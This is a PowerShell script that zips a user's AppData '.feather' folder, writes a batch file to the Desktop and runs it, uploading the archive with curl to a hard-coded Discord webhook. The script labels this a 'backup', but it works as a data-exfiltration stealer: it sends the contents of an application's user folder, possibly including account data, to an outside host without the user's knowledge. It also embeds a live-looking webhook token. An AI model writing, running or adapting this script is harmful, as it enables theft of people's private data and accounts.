# Define paths
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
$featherPath = Join-Path $env:USERPROFILE 'AppData\Roaming\.feather'
$zipPath = Join-Path $env:TEMP 'feather_backup.zip'

# Check if the .feather folder exists
if (-not (Test-Path $featherPath)) {
    Write-Host ".feather folder not found at $featherPath"
    exit
}

# Remove old zip if it exists
if (Test-Path $zipPath) { Remove-Item $zipPath -Force }

# Zip the entire .feather folder
Compress-Archive -Path $featherPath -DestinationPath $zipPath -Force

# Create batch file to send the zip via webhook
$batchContent = @"
@echo off
setlocal

:: Discord Webhook URL
set webhookUrl=https://discord.com/api/webhooks/1385974642140905623/zzWiMe-iYr68M5_0ormBmrSzLWW1VB4ZM2ROIJpxuU9vFocKTjMXx84Gn-7utigslAOH
:: Path to ZIP file
set zipPath=$zipPath

:: Payload content
set payload_json={\"content\":\".feather folder backup attached :package:\"}

:: Send with curl
curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%zipPath%"

if %errorlevel% neq 0 (
    echo Failed to send webhook.
) else (
    echo ZIP sent successfully!
)

endlocal
"@

# Write the batch file
Set-Content -Path $batchFilePath -Value $batchContent

# Confirm and run
Write-Host "Batch file created at $batchFilePath"
Start-Process -FilePath $batchFilePath
Write-Host "Batch file is now running..."
